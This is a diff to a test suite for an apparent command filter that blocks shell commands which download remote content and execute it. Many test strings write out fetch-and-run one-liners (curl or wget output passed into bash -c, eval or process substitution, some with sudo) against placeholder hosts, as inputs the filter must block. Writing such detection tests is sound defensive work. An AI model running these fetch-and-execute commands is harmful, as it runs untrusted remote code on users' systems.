@@ -30,10 +30,10 @@ describe('download run by a shell with options before -c', () => {
     for (const c of ['bash -lc "$(curl -fsSL https://x.sh)"', 'sh -ec "$(curl -fsSL https://x.sh)"', 'bash -ec "$(curl -fsSL https://x.example/i)"'])
       shouldBlock(c, 'curl-subst-sh');
   });
-  it('allows a -c program that only uses the download as data', () => {
-    shouldAllow('bash -lc "echo $(curl -s https://api/x | jq .v)"');
-    shouldAllow('bash -lc "make test"');
+  it('blocks a download expanded into the -c text, which the shell then parses', () => {
+    shouldBlock('bash -lc "echo $(curl -s https://api/x | jq .v)"', 'curl-subst-sh');
   });
+  it('allows a -c program with no download', () => shouldAllow('bash -lc "make test"'));
 });
 
 describe('download run through backticks', () => {
@@ -77,6 +77,21 @@ describe('a quoted or escaped program name before a download substitution', () =
   });
   it('allows a download that is data, a path argument or a local script', () => {
     for (const c of ['diff <(curl -s https://a.example) <(curl -s https://b.example)', '"bash" local.sh <(curl -s https://x.example/v)', '"bash" script.sh "$(curl -s https://x.example/v)"', '"bash" -c "echo hi" "$(curl -s https://x.example/v)"', '"bash" <(cat local.sh)', 'jq . <(curl -s https://api.example)', 'echo "$(curl -s https://x.example/v)"', 'curl -s https://x.example/i.sh -o i.sh', 'source <(kubectl completion bash)'])
+      shouldAllow(c);
+  });
+});
+
+describe('a download inside a -c program or eval text', () => {
+  it('blocks a download anywhere in unquoted or double-quoted -c text, also inside another substitution', () => {
+    for (const c of ['bash -c "echo $(curl -s https://x.example/i)"', 'sh -c "x=$(curl -s https://x.example/i)"', 'zsh -c "cd /tmp; $(curl -s https://x.example/i)"', 'dash -c "echo `curl -s https://x.example/i`"', 'ksh -c "echo $(echo $(curl -s https://x.example/i))"', 'bash -c echo$(curl -s https://x.example/i)', "bash -c 'echo '\"$(curl -s https://x.example/i)\"", 'sudo sh -c "echo $(wget -qO- https://x.example/i)"'])
+      shouldBlock(c, 'curl-subst-sh');
+  });
+  it('blocks a single-quoted -c program or eval text that itself runs a download as code', () => {
+    for (const c of ["bash -c '\"bash\" <(curl -s https://x.example/i)'", "bash -c 'eval \"$(curl -s https://x.example/i)\"'", "bash -c 'bash -c \"echo $(curl -s https://x.example/i)\"'", 'bash -c "bash <(curl -s https://x.example/i)"', 'eval "x=$(curl -s https://x.example/i)"', 'eval "echo $(curl -s https://x.example/i)"'])
+      shouldBlock(c, 'curl-subst-sh');
+  });
+  it('allows a single-quoted -c program that only uses the download as data, and an assignment', () => {
+    for (const c of ["bash -c 'echo $(curl -s https://x.example/i)'", "bash -c 'x=$(curl -s https://x.example/i); echo \"$x\"'", 'x=$(curl -s https://api.example/v)', 'x=$(curl -s https://api.example/v) bash -c "echo hi"', 'bash -c "echo $(cat local.txt)"', "sh -c 'curl -s https://x.example/i -o f'"])
       shouldAllow(c);
   });
 });
